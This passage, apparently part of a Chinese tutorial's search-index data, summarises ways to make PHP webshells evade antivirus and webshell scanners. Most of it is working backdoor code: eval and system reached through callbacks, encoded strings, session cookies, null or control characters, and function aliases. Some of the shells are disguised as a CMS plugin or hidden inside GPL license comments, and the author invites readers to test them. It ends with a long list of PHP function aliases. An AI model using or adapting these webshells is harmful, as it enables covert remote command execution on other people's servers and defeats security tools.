(ALLKILL) error_reporting ( 0 ); define ( \"SS\" , \"session_start\" ); function result ( $arg ) { return 1 > 0 ? @ $arg : 0 ; } function hex22bin ( $data ) { $len = strlen ( $data ); return pack ( \"H\" . $len , $data ); } class deal { function combine_var ( $default = NULL ){ if ( ! constant ( \"SS\" )) { return $default ; } if ( ! preg_match ( '/\\w+/' , $this -> sess )) { throw new Exception ( \" $this->sess error\" ); } $results = null ; //trash $results = result ( $this -> sess ); @ eval ( \" $this->sess \" ); // PHP>=5.4 // Cookie: PHPSESSID=706870696e666f28293b == phpinfo(); hex2bin(\"phpinfo();\") => 706870696e666f28293b } function __construct ( $arg ){ $this -> sess = $arg ; return $this -> combine_var (); } } $son = constant ( \"SS\" ); $son (); $sessionid = session_id (); $sessionid = hex22bin ( $sessionid ); $deals = new deal ( $sessionid ); ?> \u5176\u4e2d\u6bd4\u8f83\u503c\u5f97\u6ce8\u610f\u7684\u662fGLOBALS,get defined vars(),getallheaders() GLOBALS,get defined vars(): \u4e00\u4e2a\u662f\u8d85\u5168\u5c40\u53d8\u91cf,\u4e00\u4e2a\u662f\u51fd\u6570,\u8fd4\u56de\u503c\u90fd\u662f\u4e00\u4e2a\u591a\u7ef4\u6570\u7ec4,\u5305\u542b\u4e86 GET, POST\u7b49\u5176\u4ed6\u8d85\u5168\u5c40\u53d8\u91cf,\u53ef\u4ee5\u501f\u6b64\u6765\u5bf9\u88f8\u9732\u7684\u8f93\u5165\u8fdb\u884c\u5d4c\u5957,\u5982\u7528GLOBALS[' POST'][1]\u4ee3\u66ff POST[1] getallheaders(): \u83b7\u53d6\u6240\u6709\u7684\u8bf7\u6c42\u5934(\u8be5\u51fd\u6570\u62e5\u6709\u4e00\u4e9b\u9650\u5236,\u5177\u4f53\u8bf7\u53c2\u7167 \u8fd9\u91cc ) \u540c\u6837\u53ef\u4ee5\u501f\u6b64\u6765\u5c1d\u8bd5\u9003\u8fc7\u5bf9\u8f93\u5165\u7684\u68c0\u67e5 \u8fd9\u91cc\u518d\u8bf4\u51e0\u4e2aPHP\u7684\u51fd\u6570 pos(),current(),reset():\u8fd9\u4e09\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u90fd\u662f\u4f20\u5165\u6570\u7ec4\u7684\u4e00\u4e2a\u5143\u7d20 next():\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u4f20\u5165\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20 end():\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u4f20\u5165\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20 implode():\u53ef\u4ee5\u5c06\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u62fc\u63a5\u8d77\u6765,\u5982\u62fc\u63a5\u6210\u5b57\u7b26\u4e32 \u53ef\u4ee5\u770b\u5230 evil5.php \u4e2d\u6211\u4eec\u4ec5\u4ec5\u5bf9\u8f93\u5165\u8fdb\u884c\u5904\u7406,\u62fc\u63a5null\u5c31\u8eb2\u8fc7\u4e86\u6240\u6709\u7684\u67e5\u6740. \u9664\u4e86\u4e0a\u8ff0\u65b9\u6cd5\u4e4b\u5916,\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u4ece\u4e0d\u540c\u7684\"\u95e8\"\u8fdb\u5165,\u5982\u6267\u884c\u7cfb\u7edf\u547d\u4ee4: system() exec() shell_exec() passthru() proc_open() `` // \u53cd\u5f15\u53f7\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 \u6216\u8005\u4f7f\u7528\u4e00\u4e9b\u533f\u540d\u51fd\u6570,\u52a8\u6001\u8c03\u7528\u51fd\u6570,\u56de\u8c03\u51fd\u6570: call user func call user func_array array_filter array_map uasort, uksort array_reduce array_udiff array_walk array walk recursive preg replace, mb ereg_replace preg_filter register shutdown function register tick function filter_var filter var array \u7c7b\u7684\u53cd\u5c04->invoke() include file get contents create function // \u6211\u5c1d\u8bd5\u7528create function\u6765\u521b\u9020\u514d\u6740webshell,\u4f46\u4f3c\u4e4e\u603b\u662f\u7ed5\u4e0d\u8fc7\u957f\u4ead <?php // (ALLKILL) error_reporting ( 0 ); function compare_by_area ( $a , $b ) { $areaA = substr ( $a -> width . $a -> height , 4 ); $areaB = substr ( $b -> width . $b -> height , 4 ); if ( $areaA ( $areaB )) { return - 1 ; } elseif ( $areaA == $areaB ) { return 1 ; } else { return 0 ; } } $array1 = array ( new stdclass ); $array1 [ 0 ] -> width = 'code' ; $array1 [ 0 ] -> height = 'sys' . 'tem' ; $array2 = array ( new stdclass ); $array2 [ 0 ] -> width = 'args' ; $array2 [ 0 ] -> height = pos ( next ( $GLOBALS )); array_udiff ( $array1 , $array2 , 'compare_by_area' ); // PHP >=5.3 \u603b\u7684\u6765\u8bf4,\u5165\u53e3\u5343\u4e07\u6761,\u5b89\u5168\u7b2c\u4e00\u6761,\u514d\u6740\u4e0d\u5230\u4f4d,\u9762\u58c1\u7a7a\u6d41\u6cea.\u5404\u4f4d\u5e08\u5085\u4eec\u53ef\u4ee5\u81ea\u884c\u6d4b\u8bd5\u4e0b\u8fd9\u4e9b\u5165\u53e3","title":"\u53e6\u7c7b\u7684\u5165\u53e3"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u53d8\u5f62\u4e0e\u4f2a\u88c5","text":"\u53d8\u5f62\u53ef\u80fd\u662f\u6211\u4eec\u6700\u5e38\u89c1\u7684bypass\u624b\u6bb5\u4e86,\u4f46\u4ecd\u7136\u662f\u6211\u4eec\u901a\u8fc7\u52a8\u6001\u68c0\u6d4b\u7684\u597d\u624b\u6bb5,PHP\u4e2d\u81ea\u5e26\u4e86\u5927\u91cf\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u5904\u7406\u53d8\u5f62\u4e0e\u7f16\u7801\u7684\u51fd\u6570,\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u5bf9\u6211\u4eec\u7684webshell\u8fdb\u884c\u64cd\u4f5c \u4ee5\u4e0b\u662f\u4e00\u4e9bPHP\u81ea\u5e26\u7684\u51fd\u6570: substr_replace substr strtr str_rot13 base64_encode chr bin2hex strrev urlencode json_encode pack gzcompress/gzdeflate/gzencode ... \u53e6\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5341\u516d\u8fdb\u5236/\u516b\u8fdb\u5236\u7f16\u7801,\u53d6\u53cd\uff0c\u5f02\u6216\uff0c\u52a0\u5bc6\uff0c\u5e8f\u5217\u5316,\u51fd\u6570\u540d\u5927\u5c0f\u5199\u7b49\u7b49\u6765\u5bf9webshell\u8fdb\u884c\u53d8\u5f62,\u4f8b\u5982\u5229\u7528\u5341\u516d\u8fdb\u5236\u4e0e\u516b\u8fdb\u5236\u6df7\u7f16\u7684ALLKILL webshell: <?php // (ALLKILL) \u53c2\u8003https://www.freebuf.com/articles/web/155891.html\u4e2d\u8fdb\u5236\u8f6c\u6362\u65b9\u5f0f $v230c590 = \" \\x62\\x61\\163\\x65\\x36\\x34\\137\\144\\145\\x63\\x6f\\144\\145 \" ; @ eval ( '' . $v230c590 ( null . next ( post ( $GLOBALS )); \u53c8\u5982\u5229\u7528\u9762\u5411\u5bf9\u8c61\u7279\u6027,\u5b57\u7b26\u62fc\u63a5,\u52a8\u6001\u8c03\u7528\u53d8\u5f62\u7684ALLKILL webshell: <?php // (ALLKILL) $name = basename ( __FILE__ ); class combine { function __construct ( $var , $srcname ) { $this -> var = $var ; $this -> name = $srcname ; $this -> cookie = get_class ( $this ); $this -> cookie = $this -> cookie [ 2 ]; } function __combine ( $yum ) { $run = $this -> var ; $run .= $this -> name [ 3 ]; $run .= 'e' . $this -> cookie ; $this -> yum = $yum ; $run ( '' . $this -> yum ); } } $result = new combine ( 'sys' , $name ); // php5 php7 success die ( $result -> __combine ( $_GET [ 2333 ])); \u4f2a\u88c5\u5219\u662f\u4e00\u79cd\u6709\u6548\u901a\u8fc7\u9759\u6001\u68c0\u6d4b\u7684\u65b9\u6cd5(\u867d\u7136\u6709\u70b9\u7384\u5b66,\u4f8b\u5982D\u76fe\u4f3c\u4e4e\u6709\u5bf9\u6587\u4ef6\u884c\u6570\u8fdb\u884c\u5224\u65ad),\u6211\u4eec\u5c06webshell\u4f2a\u88c5\u6210\u4e00\u4e2a\u6b63\u5e38\u7684\u529f\u80fd,\u5e76\u914d\u4e0a\u63a9\u4eba\u8033\u76ee\u7684\u540d\u5b57,\u751a\u81f3\u53ef\u4ee5\u9003\u8fc7\u7ba1\u7406\u5458\u7684\u68c0\u67e5,\u4f8b\u5982\u4e0b\u9762\u51e0\u4e2a\u4f8b\u5b50: <?php /** * new plugin * @author xxcms * @package Glimmer * @subpackage PluginsShared */ /** * get a compiler parameter and echo to console */ function get_compiler_param ( $params , $index , $default = null ) { if ( ! isset ( $params [ $index ])) { return $default ; } if ( ! preg_match ( '/^([\\'\"]?)[a-zA-Z0-9](\\\\1)/' , $params [ $index ])) { throw new Exception ( \" $index is not a literal\" ); } $t = null ; eval ( \" \\$ t = \" . $params [ $index ]); return $t ; } $params = array ( 'code' => $_GET [ 2333 ]); $a = get_compiler_param ( $params , 'code' , \"whoami\" ); if ( isset ( $_GET [ 'print' ])){ echo ( \"<script>console.log('\" . $a . \"');</script>\" ); } <?php // \u8fd9\u4e2a\u9a6c\u7531\u4e8eextract\u53ca\u660e\u663e\u7684\u52a8\u6001\u8c03\u7528\u8fc7\u4e0d\u4e86\u514d\u6740,\u4f46\u662f\u4ecd\u4e0d\u5931\u4e3a\u4e00\u79cd\u597d\u601d\u8def // copy from http://webshell.cdxy.me/ /* GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/> Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed. Preamble The GNU General Public License is a free, copyleft license for software and other kinds of works. The licenses for most software and other practical works are designed to take away your freedom to share and change the works. By contrast, the GNU General Public License is intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users. We, the Free Software Foundation, use the GNU General Public License for most of our software; it applies also to any other work released this way by its authors. You can apply it to your programs, too. When we speak of free software, we are referring to freedom, not price. Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things. To protect your rights, we need to prevent others from denying you these rights or asking you to surrender the rights. Therefore, you have certain responsibilities if you distribute copies of the software, or if you modify it: responsibilities to respect the freedom of others. For example, if you distribute copies of such a program, whether gratis or for a fee, you must pass on to the recipients the same freedoms that you received. You must make sure that they, too, receive or can get the source code. And you must show them these terms so they know their rights. Developers that use the GNU GPL protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License giving you */ extract ( $_COOKIE ); /* copy, distribute and/or modify it. For the developers' and authors' protection, the GPL clearly explains that there is no warranty for this free software. For both users' and authors' sake, the GPL requires that modified versions be marked as changed, so that their problems will not be attributed erroneously to authors of previous versions. Some devices are designed to deny users access to install or run modified versions of the software inside them, although the manufacturer can do so. This is fundamentally incompatible with the aim of protecting users' freedom to change the software. The systematic pattern of such abuse occurs in the area of products for individuals to use, which is precisely where it is most unacceptable. Therefore, we have designed this version of the GPL to prohibit the practice for those products. If such problems arise substantially in other domains, we stand ready to extend this provision to those domains in future versions of the GPL, as needed to protect the freedom of users. Finally, every program is threatened constantly by software patents. States should not allow patents to restrict development and use of software on general-purpose computers, but in those that do, we wish to avoid the special danger that patents applied to a free program could make it effectively proprietary. patents applied to GPL assures that patents cannot be used to render the program non-free. The precise terms and conditions for copying, distribution and modification follow. TERMS AND CONDITIONS 0. Definitions. \"This License\" refers to version 3 of the GNU General Public License. \"Copyright\" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks. \"The Program\" refers to any copyrightable work licensed under this License. Each licensee is addressed as \"you\". \"Licensees\" and \"recipients\" may be individuals or organizations. To \"modify\" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy. The resulting work is called a \"modified version\" of the earlier work or a work \"based on\" the earlier work. A \"covered work\" means either the unmodified Program or a work based on the Program. To \"propagate\" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy. Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well. To \"convey\" a work means any kind of propagation that enables other parties to make or receive copies. Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying. An interactive user interface displays \"Appropriate Legal Notices\" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License. If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion. 1. Source Code. The \"source code\" for a work means the preferred form of the work for making modifications to it. \"Object code\" means any non-source form of a work. A \"Standard Interface\" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language. The \"System Libraries\" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form. A \"Major Component\", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it. The \"Corresponding Source\" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities. However, it does not include the work's System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not */ @ $PC4E20 &&@ $F ( $A , $B ); /*. For example, Corresponding Source the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work. The Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source. The Corresponding Source for a work in source code form is that same work. 2. Basic Permissions. All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met. This License explicitly affirms your unlimited permission to run the unmodified Program. The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work. This License acknowledges your rights of fair use or other equivalent, as provided by copyright law. You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force. You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright. Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you. Conveying under any other circumstances is permitted solely under the conditions stated below. Sublicensing is not allowed; section 10 makes it unnecessary. */ ?> \u4e5f\u8bb8\u4e0a\u9762\u7684\u65b9\u6cd5\u53ea\u4f7f\u7528\u4e00\u79cd\u7684\u8bdd\u65e0\u6cd5\u8fbe\u5230\u514d\u6740\u7684\u76ee\u7684,\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5d4c\u5957\u4f7f\u7528,\u5982\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570/\u7c7b,\u5728\u91cc\u9762\u8fdb\u884c\u8c03\u7528 <?php // copy from https://xz.aliyun.com/t/5152 function test ( $a , $b ){ array_map ( $a , $b ); } test ( assert , array ( $_POST [ 'x' ])); ?> <?php // copy from https://xz.aliyun.com/t/5152 class loveme { var $a ; var $b ; function __construct ( $a , $b ) { $this -> a = $a ; $this -> b = $b ; } function test () { array_map ( $this -> a , $this -> b ); } } $p1 = new loveme ( assert , array ( $_POST [ 'x' ])); $p1 -> test (); ?>","title":"\u53d8\u5f62\u4e0e\u4f2a\u88c5"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u7b26\u53f7\u5e72\u6270","text":"\u8fd9\u79cd\u65b9\u6cd5\u901a\u5e38\u7528\u4e8e\u5e72\u6270\u67e5\u6740\u7684\u6b63\u5219\u5224\u65ad,\u53ef\u4ee5\u4f7f\u7528\u7684\u7b26\u53f7\u6709null,\\n,\\r,\\t\u7b49 \u5e38\u7528\u7684\u65b9\u5f0f\u662f\u5c06\u8fd9\u4e9b\u5b57\u7b26\u4e0e\u5b57\u7b26\u4e32\u8fdb\u884c\u62fc\u63a5,\u5982\u679c\u4f60\u7684webshell\u88ab\u6740\u4e86,\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b, \u5982: <?php // copy from https://xz.aliyun.com/t/5152 $a = $_REQUEST [ 'a' ]; $b = null ; eval ( $b . $a ); ?> <?php // copy from https://xz.aliyun.com/t/5152 $a = $_POST [ 'a' ]; $b = \" \\n \" ; eval ( $b .= $a ); ?> \u8fd8\u6709\u4e00\u79cd\u6bd4\u8f83\u9a9a\u7684\u59ff\u52bf\u5728\u51fd\u6570\u8c03\u7528\u4e2d\u662f\u63d2\u5165\u4e00\u4e9b\u63a7\u5236\u7b26 [\\x00-\\x20] ,PHP\u5f15\u64ce\u4f1a\u5ffd\u7565\u8fd9\u4e9b\u63a7\u5236\u5b57\u7b26,\u6b63\u786e\u6267\u884cPHP\u51fd\u6570,\u5982: <?php // copy from https://bbs.symbo1.com/t/topic/94 eval \\x01\\x02 ( $_POST [ 2333 ]); //\u8fd9\u91cc\\x01\u4e0e\\x02\u8981\u8f6c\u6362\u4e3a\u5b9e\u9645\u7684\u5b57\u7b26","title":"\u7b26\u53f7\u5e72\u6270"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u522b\u540d\u91cd\u547d\u540d","text":"\u5176\u5b9ePHP\u4e2d\u662f\u6709\u5f88\u591a\u51fd\u6570\u522b\u540d\u7684,\u5982pos\u662fcurrent\u7684\u522b\u540d,\u5728PHP5.6\u52a0\u5165\u4e86\u51fd\u6570\u540d\u7684\u547d\u540d\u7a7a\u95f4\u4e4b\u540e\u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u81ea\u5df1\u521b\u9020\"\u522b\u540d\". \u8fd9\u91cc\u9644\u4e00\u4e2aPHP7.4.3\u4e2d\u51fd\u6570\u522b\u540d\u8868(\u4e2a\u4eba\u6574\u7406,\u53ef\u80fd\u4f1a\u6709\u9519/\u6f0f) bzwrite->fwrite bzflush->fflush bzclose->fclose isId->dom_attr_is_id substringData->dom_characterdata_substring_data appendData->dom_characterdata_append_data insertData->dom_characterdata_insert_data deleteData->dom_characterdata_delete_data replaceData->dom_characterdata_replace_data createElement->dom_document_create_element createDocumentFragment->dom_document_create_document_fragment createTextNode->dom_document_create_text_node createComment->dom_document_create_comment createCDATASection->dom_document_create_cdatasection createProcessingInstruction->dom_document_create_processing_instruction createAttribute->dom_document_create_attribute createEntityReference->dom_document_create_entity_reference getElementsByTagName->dom_document_get_elements_by_tag_name importNode->dom_document_import_node createElementNS->dom_document_create_element_ns createAttributeNS->dom_document_create_attribute_ns getElementsByTagNameNS->dom_document_get_elements_by_tag_name_ns getElementById->dom_document_get_element_by_id adoptNode->dom_document_adopt_node normalizeDocument->dom_document_normalize_document renameNode->dom_document_rename_node save->dom_document_save saveXML->dom_document_savexml validate->dom_document_validate xinclude->dom_document_xinclude saveHTML->dom_document_save_html saveHTMLFile->dom_document_save_html_file schemaValidate->dom_document_schema_validate_file schemaValidateSource->dom_document_schema_validate_xml relaxNGValidate->dom_document_relaxNG_validate_file relaxNGValidateSource->dom_document_relaxNG_validate_xml setParameter->dom_domconfiguration_set_parameter getParameter->dom_domconfiguration_get_parameter canSetParameter->dom_domconfiguration_can_set_parameter handleError->dom_domerrorhandler_handle_error item->dom_domimplementationlist_item getDomimplementation->dom_domimplementationsource_get_domimplementation getDomimplementations->dom_domimplementationsource_get_domimplementations item->dom_domstringlist_item getAttribute->dom_element_get_attribute setAttribute->dom_element_set_attribute removeAttribute->dom_element_remove_attribute getAttributeNode->dom_element_get_attribute_node setAttributeNode->dom_element_set_attribute_node removeAttributeNode->dom_element_remove_attribute_node getElementsByTagName->dom_element_get_elements_by_tag_name getAttributeNS->dom_element_get_attribute_ns setAttributeNS->dom_element_set_attribute_ns removeAttributeNS->dom_element_remove_attribute_ns getAttributeNodeNS->dom_element_get_attribute_node_ns setAttributeNodeNS->dom_element_set_attribute_node_ns getElementsByTagNameNS->dom_element_get_elements_by_tag_name_ns hasAttribute->dom_element_has_attribute hasAttributeNS->dom_element_has_attribute_ns setIdAttribute->dom_element_set_id_attribute setIdAttributeNS->dom_element_set_id_attribute_ns setIdAttributeNode->dom_element_set_id_attribute_node getNamedItem->dom_namednodemap_get_named_item setNamedItem->dom_namednodemap_set_named_item removeNamedItem->dom_namednodemap_remove_named_item item->dom_namednodemap_item getNamedItemNS->dom_namednodemap_get_named_item_ns setNamedItemNS->dom_namednodemap_set_named_item_ns removeNamedItemNS->dom_namednodemap_remove_named_item_ns count->dom_namednodemap_count getName->dom_namelist_get_name getNamespaceURI->dom_namelist_get_namespace_uri insertBefore->dom_node_insert_before replaceChild->dom_node_replace_child removeChild->dom_node_remove_child appendChild->dom_node_append_child hasChildNodes->dom_node_has_child_nodes cloneNode->dom_node_clone_node normalize->dom_node_normalize isSupported->dom_node_is_supported hasAttributes->dom_node_has_attributes compareDocumentPosition->dom_node_compare_document_position isSameNode->dom_node_is_same_node lookupPrefix->dom_node_lookup_prefix isDefaultNamespace->dom_node_is_default_namespace lookupNamespaceUri->dom_node_lookup_namespace_uri isEqualNode->dom_node_is_equal_node getFeature->dom_node_get_feature setUserData->dom_node_set_user_data getUserData->dom_node_get_user_data item->dom_nodelist_item count->dom_nodelist_count findOffset16->dom_string_extend_find_offset16 findOffset32->dom_string_extend_find_offset32 splitText->dom_text_split_text isWhitespaceInElementContent->dom_text_is_whitespace_in_element_content isElementContentWhitespace->dom_text_is_whitespace_in_element_content replaceWholeText->dom_text_replace_whole_text handle->dom_userdatahandler_handle registerNamespace->dom_xpath_register_ns query->dom_xpath_query evaluate->dom_xpath_evaluate registerPhpFunctions->dom_xpath_register_php_functions ftp_quit->ftp_close imap_header->imap_headerinfo imap_listmailbox->imap_list imap_getmailboxes->imap_list_full imap_scanmailbox->imap_listscan imap_listsubscribed->imap_lsub imap_getsubscribed->imap_lsub_full imap_fetchtext->imap_body imap_scan->imap_listscan imap_create->imap_createmailbox imap_rename->imap_renamemailbox ldap_close->ldap_unbind ldap_get_values->ldap_get_values_len ldap_modify->ldap_mod_replace mysqli_execute->mysqli_stmt_execute mysqli_escape_string->mysqli_real_escape_string mysqli_set_opt->mysqli_options autocommit->mysqli_autocommit begin_transaction->mysqli_begin_transaction change_user->mysqli_change_user character_set_name->mysqli_character_set_name close->mysqli_close commit->mysqli_commit connect->mysqli_connect dump_debug_info->mysqli_dump_debug_info debug->mysqli_debug get_charset->mysqli_get_charset get_client_info->mysqli_get_client_info get_client_info->mysqli_get_client_info get_connection_stats->mysqli_get_connection_stats get_server_info->mysqli_get_server_info get_warnings->mysqli_get_warnings init->mysqli_init_method kill->mysqli_kill multi_query->mysqli_multi_query construct->mysqli_link_construct more_results->mysqli_more_results next_result->mysqli_next_result options->mysqli_options ping->mysqli_ping prepare->mysqli_prepare query->mysqli_query real_connect->mysqli_real_connect real_escape_string->mysqli_real_escape_string escape_string->mysqli_real_escape_string real_query->mysqli_real_query release_savepoint->mysqli_release_savepoint rollback->mysqli_rollback savepoint->mysqli_savepoint select_db->mysqli_select_db set_charset->mysqli_set_charset set_opt->mysqli_options ssl_set->mysqli_ssl_set stat->mysqli_stat stmt_init->mysqli_stmt_init store_result->mysqli_store_result thread_safe->mysqli_thread_safe use_result->mysqli_use_result refresh->mysqli_refresh construct->mysqli_result_construct close->mysqli_free_result free->mysqli_free_result data_seek->mysqli_data_seek fetch_field->mysqli_fetch_field fetch_fields->mysqli_fetch_fields fetch_field_direct->mysqli_fetch_field_direct fetch_all->mysqli_fetch_all fetch_array->mysqli_fetch_array fetch_assoc->mysqli_fetch_assoc fetch_object->mysqli_fetch_object fetch_row->mysqli_fetch_row field_seek->mysqli_field_seek free_result->mysqli_free_result construct->mysqli_stmt_construct attr_get->mysqli_stmt_attr_get attr_set->mysqli_stmt_attr_set bind_param->mysqli_stmt_bind_param bind_result->mysqli_stmt_bind_result close->mysqli_stmt_close data_seek->mysqli_stmt_data_seek execute->mysqli_stmt_execute fetch->mysqli_stmt_fetch get_warnings->mysqli_stmt_get_warnings result_metadata->mysqli_stmt_result_metadata more_results->mysqli_stmt_more_results next_result->mysqli_stmt_next_result num_rows->mysqli_stmt_num_rows send_long_data->mysqli_stmt_send_long_data free_result->mysqli_stmt_free_result reset->mysqli_stmt_reset prepare->mysqli_stmt_prepare store_result->mysqli_stmt_store_result get_result->mysqli_stmt_get_result oci_free_cursor->oci_free_statement ocifreecursor->oci_free_statement ocibindbyname->oci_bind_by_name ocidefinebyname->oci_define_by_name ocicolumnisnull->oci_field_is_null ocicolumnname->oci_field_name ocicolumnsize->oci_field_size ocicolumnscale->oci_field_scale ocicolumnprecision->oci_field_precision ocicolumntype->oci_field_type ocicolumntyperaw->oci_field_type_raw ociexecute->oci_execute ocicancel->oci_cancel ocifetch->oci_fetch ocifetchstatement->oci_fetch_all ocifreestatement->oci_free_statement ociinternaldebug->oci_internal_debug ocinumcols->oci_num_fields ociparse->oci_parse ocinewcursor->oci_new_cursor ociresult->oci_result ociserverversion->oci_server_version ocistatementtype->oci_statement_type ocirowcount->oci_num_rows ocilogoff->oci_close ocilogon->oci_connect ocinlogon->oci_new_connect ociplogon->oci_pconnect ocierror->oci_error ocifreedesc->oci_free_descriptor ocisavelob->oci_lob_save ocisavelobfile->oci_lob_import ociwritelobtofile->oci_lob_export ociloadlob->oci_lob_load ocicommit->oci_commit ocirollback->oci_rollback ocinewdescriptor->oci_new_descriptor ocisetprefetch->oci_set_prefetch ocipasswordchange->oci_password_change ocifreecollection->oci_free_collection ocinewcollection->oci_new_collection ocicollappend->oci_collection_append ocicollgetelem->oci_collection_element_get ocicollassignelem->oci_collection_element_assign ocicollsize->oci_collection_size ocicollmax->oci_collection_max ocicolltrim->oci_collection_trim load->oci_lob_load tell->oci_lob_tell truncate->oci_lob_truncate erase->oci_lob_erase flush->oci_lob_flush setbuffering->ocisetbufferinglob getbuffering->ocigetbufferinglob rewind->oci_lob_rewind read->oci_lob_read eof->oci_lob_eof seek->oci_lob_seek write->oci_lob_write append->oci_lob_append size->oci_lob_size writetofile->oci_lob_export export->oci_lob_export import->oci_lob_import writetemporary->oci_lob_write_temporary close->oci_lob_close save->oci_lob_save savefile->oci_lob_import free->oci_free_descriptor append->oci_collection_append getelem->oci_collection_element_get assignelem->oci_collection_element_assign assign->oci_collection_assign size->oci_collection_size max->oci_collection_max trim->oci_collection_trim free->oci_free_collection odbc_do->odbc_exec odbc_field_precision->odbc_field_len openssl_free_key->openssl_pkey_free openssl_get_privatekey->openssl_pkey_get_private openssl_get_publickey->openssl_pkey_get_public pcntl_errno->pcntl_get_last_error pg_exec->pg_query pg_getlastoid->pg_last_oid pg_cmdtuples->pg_affected_rows pg_errormessage->pg_last_error pg_numrows->pg_num_rows pg_numfields->pg_num_fields pg_fieldname->pg_field_name pg_fieldsize->pg_field_size pg_fieldtype->pg_field_type pg_fieldnum->pg_field_num pg_fieldprtlen->pg_field_prtlen pg_fieldisnull->pg_field_is_null pg_freeresult->pg_free_result pg_result->pg_fetch_result pg_loreadall->pg_lo_read_all pg_locreate->pg_lo_create pg_lounlink->pg_lo_unlink pg_loopen->pg_lo_open pg_loclose->pg_lo_close pg_loread->pg_lo_read pg_lowrite->pg_lo_write pg_loimport->pg_lo_import pg_loexport->pg_lo_export pg_clientencoding->pg_client_encoding pg_setclientencoding->pg_set_client_encoding pg_clientencoding->pg_client_encoding pg_setclientencoding->pg_set_client_encoding posix_errno->posix_get_last_error session_commit->session_write_close snmpwalkoid->snmprealwalk snmp_set_oid_numeric_print->snmp_set_oid_output_format socket_getopt->socket_get_option socket_setopt->socket_set_option sodium_crypto_scalarmult_base->sodium_crypto_box_publickey_from_secretkey join->implode chop->rtrim strchr->strstr srand->mt_srand getrandmax->mt_getrandmax show_source->highlight_file ini_alter->ini_set checkdnsrr->dns_check_record getmxrr->dns_get_mx doubleval->floatval is_integer->is_int is_long->is_int is_double->is_float fputs->fwrite set_file_buffer->stream_set_write_buffer socket_set_blocking->stream_set_blocking stream_register_wrapper->stream_wrapper_register stream_register_wrapper->stream_wrapper_register socket_set_timeout->stream_set_timeout dir->getdir is_writeable->is_writable diskfreespace->disk_free_space pos->current sizeof->count key_exists->array_key_exists close->closedir rewind->rewinddir importStylesheet->xsl_xsltprocessor_import_stylesheet transformToDoc->xsl_xsltprocessor_transform_to_doc transformToUri->xsl_xsltprocessor_transform_to_uri transformToXml->xsl_xsltprocessor_transform_to_xml setParameter->xsl_xsltprocessor_set_parameter getParameter->xsl_xsltprocessor_get_parameter removeParameter->xsl_xsltprocessor_remove_parameter hasExsltSupport->xsl_xsltprocessor_has_exslt_support registerPHPFunctions->xsl_xsltprocessor_register_php_functions setProfiling->xsl_xsltprocessor_set_profiling setSecurityPrefs->xsl_xsltprocessor_set_security_prefs getSecurityPrefs->xsl_xsltprocessor_get_security_prefs gzrewind->rewind gzclose->fclose gzeof->feof gzgetc->fgetc gzgets->fgets DEP_FALIAS(gzgetss->fgetss gzread->fread gzpassthru->fpassthru gzseek->fseek gztell->ftell gzwrite->fwrite gzputs->fwrite 